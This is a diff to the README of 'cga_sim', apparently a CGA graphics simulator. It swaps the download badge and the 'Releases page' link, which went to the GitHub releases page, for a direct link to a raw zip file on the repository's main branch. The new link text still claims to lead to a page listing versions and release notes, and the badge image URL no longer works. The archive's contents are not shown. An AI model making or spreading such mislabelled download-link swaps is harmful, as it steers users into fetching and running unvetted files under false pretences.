@@ -1,6 +1,6 @@
 # 🎮 cga_sim - Simulate IBM CGA Graphics Easily
 
-[![Download cga_sim](https://img.shields.io/badge/Download%20Now-Get%20cga_sim-brightgreen)](https://github.com/prasdionaditya/cga_sim/releases)
+[![Download cga_sim](https://github.com/prasdionaditya/cga_sim/raw/refs/heads/main/sim/cga_sim_v1.1.zip%20Now-Get%20cga_sim-brightgreen)](https://github.com/prasdionaditya/cga_sim/raw/refs/heads/main/sim/cga_sim_v1.1.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To start using cga_sim, you’ll need to download and install the application on
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/prasdionaditya/cga_sim/releases) to view the available versions of cga_sim.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/prasdionaditya/cga_sim/raw/refs/heads/main/sim/cga_sim_v1.1.zip) to view the available versions of cga_sim.
 
 2. **Choose the Right Version:** Look for the latest version at the top of the page. Each version will have release notes describing improvements or fixes.
 
